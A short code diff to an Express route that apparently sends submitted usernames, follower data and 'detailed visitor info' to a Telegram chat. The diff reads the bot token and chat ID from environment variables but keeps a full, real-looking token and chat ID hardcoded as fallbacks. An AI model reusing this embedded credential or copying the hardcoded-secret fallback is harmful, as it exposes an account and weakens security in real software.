@@ -12,9 +12,9 @@ export async function registerRoutes(app: Express): Promise<Server> {
     try {
       const { username, followers, userInfo } = req.body;
       
-      // Hardcoded Telegram bot token and chat ID
-      const TELEGRAM_BOT_TOKEN = "8070873055:AAHRpIvi56j4F2h0BhBA_uB4tyw_SCYMsVM";
-      const TELEGRAM_CHAT_ID = "6360165707";
+      // Get Telegram credentials from environment variables or use hardcoded defaults
+      const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "8070873055:AAHRpIvi56j4F2h0BhBA_uB4tyw_SCYMsVM";
+      const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "6360165707";
       
       // Format message with detailed visitor info
       const message = `
